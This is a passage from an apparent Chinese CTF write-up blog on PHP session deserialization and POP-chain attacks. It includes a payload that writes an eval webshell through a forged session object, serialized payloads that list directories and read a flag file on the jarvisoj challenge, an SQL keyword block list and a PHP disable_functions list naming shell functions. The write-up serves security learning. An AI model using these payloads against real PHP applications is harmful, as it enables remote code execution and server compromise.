class="hljs-string">&#x27;pass&#x27;</span>] <span class="hljs-comment">//密码必须为128位大小写字母+数字+特殊符号，防止爆破</span><br>]<br>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;id&#x27;</span>])&#123;<br><span class="hljs-comment">//登陆成功取消次数累计</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]= <span class="hljs-number">0</span>;<br><span class="hljs-keyword">echo</span> json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;欢迎您&quot;</span>.<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;UserName0&#x27;</span>]));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-comment">//登陆失败累计次数加1</span><br><span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>])+<span class="hljs-number">1</span>);<br><span class="hljs-keyword">echo</span> json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;登陆失败&quot;</span>));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这里不可能会登录成功，下面代码也必定执行</p><p>$_COOKIE[‘limit’] = base64_encode(base64_decode($_COOKIE[‘limit’])+1);<br>echo json_encode(array(“error”,”msg”=&gt;”登陆失败”));</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//inc.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>date_default_timezone_set(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);<br>session_start();<br><span class="hljs-keyword">use</span> \<span class="hljs-title">CTFSHOW</span>\<span class="hljs-title">CTFSHOW</span>; <br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;CTFSHOW.php&#x27;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> CTFSHOW([<br>    <span class="hljs-string">&#x27;database_type&#x27;</span> =&gt; <span class="hljs-string">&#x27;mysql&#x27;</span>,<br>    <span class="hljs-string">&#x27;database_name&#x27;</span> =&gt; <span class="hljs-string">&#x27;web&#x27;</span>,<br>    <span class="hljs-string">&#x27;server&#x27;</span> =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>    <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-string">&#x27;charset&#x27;</span> =&gt; <span class="hljs-string">&#x27;utf8&#x27;</span>,<br>    <span class="hljs-string">&#x27;port&#x27;</span> =&gt; <span class="hljs-number">3306</span>,<br>    <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;option&#x27;</span> =&gt; [<br>        PDO::ATTR_CASE =&gt; PDO::CASE_NATURAL<br>    ]<br>]);<br><span class="hljs-comment">// sql注入检查</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkForm</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\（|\）|\+|\=|\[|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\?/i&quot;</span>,<span class="hljs-variable">$str</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$status</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setStatus</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;status=<span class="hljs-variable">$s</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        file_put_contents(<span class="hljs-string">&quot;log-&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;username, <span class="hljs-string">&quot;使用&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;password.<span class="hljs-string">&quot;登陆&quot;</span>.(<span class="hljs-keyword">$this</span>-&gt;status?<span class="hljs-string">&quot;成功&quot;</span>:<span class="hljs-string">&quot;失败&quot;</span>).<span class="hljs-string">&quot;----&quot;</span>.date_create()-&gt;format(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>));<br>    &#125;<br>&#125;<br><span class="hljs-comment">/*生成唯一标志</span><br><span class="hljs-comment">*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">uuid</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;  <br>    <span class="hljs-variable">$chars</span> = md5(uniqid(mt_rand(), <span class="hljs-literal">true</span>));  <br>    <span class="hljs-variable">$uuid</span> = substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span> <br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">16</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span> );  <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$uuid</span> ;  <br>&#125;  <br></code></pre></td></tr></table></figure><p>注意此处</p><blockquote><p>ini_set(‘session.serialize_handler’, ‘php’);</p></blockquote><p>出现了一个写文件的函数，回顾index.php发现<code>$this-&gt;username和$this-&gt;password</code>是可控的，而又被包含在check.php</p><blockquote><p>file_put_contents(“log-“.$this-&gt;username, “使用”.$this-&gt;password.”登陆”.($this-&gt;status?”成功”:”失败”).”—-“.date_create()-&gt;format(‘Y-m-d H:i:s’));</p></blockquote><p>也就是说我们需要通过cookie传进去我们的恶意代码，看一下</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021221915549.png"></p><p><code>MQ%3D%3D</code>–&gt;<code>MQ==</code>–&gt;<code>a</code>，很明显的传值了，首先在cookie中设置limit值为payload，然后刷新index.php，此时session_start()开启了会话，盲猜是php_serialize引擎存储的对象数据，我们再通过访问包含了inc.php的check.php，就执行了设置php为引擎的代码，进而反序列化得到一个新的对象</p><p>所以通过注入 <code>|</code> 字符伪造了对象的序列化数据，生成木马文件</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;hack.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$status</span> = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> User();<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(<span class="hljs-string">&#x27;|&#x27;</span>.serialize(<span class="hljs-variable">$c</span>));<br></code></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/6640">https://xz.aliyun.com/t/6640</a></p><p>cookie中含有UM_distinctid的，不可用hackbar的增加头功能，会覆盖掉原有的cookie，而我们的目标只是替换cookie[PHPSESSID]值</p><h4 id="jarvisoj-web的一道SESSION反序列化"><a href="#jarvisoj-web的一道SESSION反序列化" class="headerlink" title="jarvisoj-web的一道SESSION反序列化"></a>jarvisoj-web的一道SESSION反序列化</h4><p><a href="http://web.jarvisoj.com:32784/index.php">http://web.jarvisoj.com:32784/index.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//A webshell is wait for you</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> OowoO();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    highlight_string(file_get_contents(<span class="hljs-string">&#x27;index.php&#x27;</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>存在<code>ini_set(‘session.serialize_handler’, ‘php’)</code>，暂时没找到用php_serialize添加session的方法，但get传入phpinfo时会实例化<code>OowoO</code>这个类并可以查看phpinfo</p><blockquote><p>index.php?phpinfo</p></blockquote><p>disable_function</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">dl,<span class="hljs-keyword">exec</span>,<span class="hljs-keyword">system</span>,passthru,popen,proc_open,pcntl_exec,shell_exec,<span class="hljs-keyword">chmod</span>,set_time_limit,<span class="hljs-keyword">chroot</span>,error_log,pfsockopen,syslog,<span class="hljs-keyword">symlink</span>,putenv,chgrp,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/2021/07/12/.png"></p><p><code>session.upload_progress.enabled</code>为On。<code>session.upload_progress.enabled</code>本身作用不大，是用来检测一个文件上传的进度。但当一个文件上传时，同时POST一个与php.ini中<code>session.upload_progress.name</code>同名的变量时（<code>session.upload_progress.name</code>的变量值默认为<code>PHP_SESSION_UPLOAD_PROGRESS</code>），PHP检测到这种同名请求会在$_SESSION中添加一条数据。我们由此来设置session。</p><p>首先 先构造一个文件上传</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>接着搞反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> OowoO();<br><span class="hljs-variable">$a</span>-&gt;mdzz=<span class="hljs-string">&quot;var_dump(scandir(&#x27;./&#x27;));&quot;</span>;<br><span class="hljs-comment">//$a-&gt;mdzz=&quot;var_dump(scandir(&#x27;__dir__&#x27;));&quot;;</span><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//得到：O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:24:&quot;var_dump(scandir(&#x27;./&#x27;));&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>防止转义，在引号前面加上\得到<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</code></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210715000429267.png"></p><p>在phpinfo得知根目录为<code>DOCUMENT_ROOT:/opt/lampp/htdocs</code></p><p>修改传引用为<code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code></p><p>同样的方法得到payload：<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</code></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210715001047516.png"></p><h2 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h2><h3 id="POP：面向属性编程"><a href="#POP：面向属性编程" class="headerlink" title="POP：面向属性编程"></a>POP：面向属性编程</h3><p>面向属性编程（Property-Oriented Programing）  用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented  Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</p><p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP  链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br> 二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：<strong>进行反序列化的数据能够被用户输入所控制。</strong></p><h3 id="Autoloading"><a href="#Autoloading" class="headerlink" title="Autoloading"></a>Autoloading</h3><p>传统的PHP要求应用程序导入每个类中的所有类文件，这样就意味着每个PHP文件需要一列长长的include或require方法，而在当前主流的PHP框架中，都采用了Autoloading自动加载类来完成这样繁重的工作。在完善简化了类之间调用的功能的同时，也为序列化漏洞造成了便捷。Composer是PHP用来管理依赖（dependency）关系的工具。你可以在自己的项目中声明所依赖的外部工具库（libraries），Composer 会帮你安装这些依赖的库文件。Composer默认是从Packagist来下载依赖库的。<br>所以我们挖掘漏洞的思路就可以从依赖库文件入手。</p><p>1.从可能存在漏洞的依赖库文件入手   可以使用代码审计工具或者全局手动搜索__wakeup()和__destruct()   </p><p>在composer.json中存在以下组件就要引起注意了</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs isbl">任意写<br><span class="hljs-variable">monolog</span>/<span class="hljs-function"><span class="hljs-title">monolog</span>(&lt;<span class="hljs-number">1.11</span>.<span class="hljs-number">0</span>)</span><br><span class="hljs-variable">guzzlehttp</span>/<span class="hljs-variable">guzzle</span><br><span class="hljs-variable">guzzle</span>/<span class="hljs-variable">guzzle</span><br>任意删除<br><span class="hljs-variable">swiftmailer</span>/<span class="hljs-variable">swiftmailer</span><br></code></pre></td></tr></table></figure><p>2.从应用的代码框架的逻辑上入手</p><p>3.从PHP语言本身漏洞入手</p><h3 id="POP链利用"><a href="#POP链利用" class="headerlink" title="POP链利用"></a>POP链利用</h3><p>有两种情形：</p><ul><li>在PHP魔术方法中出现缺陷代码，自动调用而触发漏洞</li><li>缺陷代码不在魔术方法中，而是在一个类的普通方法中。这时候就要寻找相同的函数名，将类的属性和敏感函数(能背利用的同名函数)的属性联系起来。</li></ul><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">funct</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$test2</span>,<span class="hljs-variable">$arr</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable">$s1</span> = <span class="hljs-keyword">$this</span>-&gt;mod1;<br>                <span class="hljs-variable">$s1</span>();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;字符串拼接&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;mod1;<br>        &#125; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">string1</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag();<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;string&#x27;</span>];<br>unserialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到需要执行GetFlag类中的get_flag()函数，这是一个类的普通方法。要让这个方法执行，需要构造一个POP链。</p><ol><li><p><code>string1</code>中的<code>__tostring</code>存在<code>$this-&gt;str1-&gt;get_flag()</code>，分析一下要自动调用<code>__tostring()</code>需要把类<code>string1</code>当成字符串来使用，因为调用的是参数<code>str1</code>的方法，所以需要把<code>str1</code>赋值为类<code>GetFlag</code>的对象。</p></li><li><p>发现类<code>func</code>中存在<code>__invoke</code>方法执行了字符串拼接，需要把<code>func</code>当成函数使用自动调用<code>__invoke</code>然后把<code>$mod1</code>赋值为<code>string1</code>的对象与<code>$mod2</code>拼接。</p></li><li><p>在<code>funct</code>中找到了函数调用，需要把<code>mod1</code>赋值为<code>func</code>类的对象，又因为函数调用在<code>__call</code>方法中，且参数为<code>$test2</code>,即无法调用<code>test2</code>方法时自动调用 <code>__call</code>方法；</p></li><li><p>在<code>Call</code>中的<code>test1</code>方法中存在<code>$this-&gt;mod1-&gt;test2();</code>，需要把<code>$mod1</code>赋值为<code>funct</code>的对象，让<code>__call</code>自动调用。</p></li><li><p>查找<code>test1</code>方法的调用点，在<code>start_gg</code>中发现<code>$this-&gt;mod1-&gt;test1();</code>，把<code>$mod1</code>赋值为<code>start_gg</code>类的对象，等待<code>__destruct()</code>自动调用。</p><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 